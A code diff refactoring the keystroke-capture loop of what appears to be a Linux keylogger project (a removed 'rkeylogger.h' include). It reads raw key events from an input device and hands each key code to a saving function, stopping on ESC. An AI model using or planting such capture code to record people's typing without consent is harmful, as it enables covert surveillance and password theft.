@@ -2,32 +2,27 @@
 #include <unistd.h>
 #include <linux/input.h>
 #include <iostream>
-#include <vector>
+#include "read_input_file.h"
+#include "map_code.h"
 
-#include "rkeylogger.h"
-
-void read_devnode(const char *devnode) {
+bool read_input_file(const char *devnode) {
     int fd = open(devnode, O_RDONLY);
-    if (fd == -1) {
-        std::cerr << "[ ERROR ]: Cannot open the keyboard.\n" << std::endl;
-        return;
-    }
+    if (fd == -1)
+        return false;
     
     struct input_event ev;
-    
-    while (true) {
+    bool is_esc_pressed = false;
+    while (!is_esc_pressed) { //Stop if KEY_ESC if pressed
         ssize_t bytesRead = read(fd, &ev, sizeof(struct input_event));
         if (
             bytesRead == sizeof(struct input_event) && 
             ev.type == EV_KEY &&
             (ev.value == 0 || ev.value == 1)
         ) {
-            if(map_code(ev.code, ev.value)){
-                break;
-            }
+            is_esc_pressed = map_code(ev.code, ev.value) != MapSaveStatus::SUCCESS;
         }
     }
 
     close(fd);
-    std::cout << "[ LOG ]: Success" << std::endl;
+    return true;
 }
